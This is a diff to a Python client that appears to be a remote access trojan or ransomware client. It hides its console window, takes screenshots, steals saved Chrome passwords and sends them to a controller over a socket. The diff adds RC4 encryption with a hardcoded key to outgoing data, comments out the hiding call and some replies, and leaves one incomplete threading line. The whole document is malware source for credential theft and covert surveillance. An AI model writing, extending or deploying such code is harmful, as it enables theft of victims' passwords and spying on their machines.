@@ -8,6 +8,7 @@ import base64
 from PIL import ImageGrab
 from packet import Packet
 from encryption import encrypt,decrypt
+from Crypto.Cipher import ARC4
 
 def hide():
     import win32console,win32gui
@@ -39,7 +40,7 @@ class Client:
             pkt.construct(self.s)
             if pkt.state:
                 if pkt.state == "100":
-                    print "hello"
+                    threading.Thread
                 elif pkt.state == "143":
                     threading.Thread(target=self.screenshot,args=[pkt]).start()
                 elif pkt.state == "144":
@@ -100,9 +101,9 @@ class Client:
     def decrypt(self,pkt):
         if pkt.data != "":
             decrypt(pkt.data)
-            pkt.data = "There you go! Sorry about that."
-            pkt.length = len(pkt.data)
-            self.enqueue(pkt)
+            # pkt.data = "decrypted"
+            # pkt.length = len(pkt.data)
+            # self.enqueue(pkt)
 
     def passwords(self,pkt):
         message = passwords.getChromePasswords()
@@ -116,7 +117,13 @@ class Client:
 
         self.enqueue(pkt)
 
+    def encryptData(self,pkt):
+        key = "0102030405"
+        cipher = ARC4.new(key)
+        pkt.data = cipher.encrypt(pkt.data)
+
     def enqueue(self,pkt):
+        self.encryptData(pkt)
         self.messageQ.put(pkt)
 
     def dequeue(self):
@@ -130,7 +137,7 @@ def main():
     c.run()
 
 if __name__ == '__main__':
-    hide()
+    # hide()
     #signal handlers
     signal.signal(signal.SIGINT, signal_handler)
 
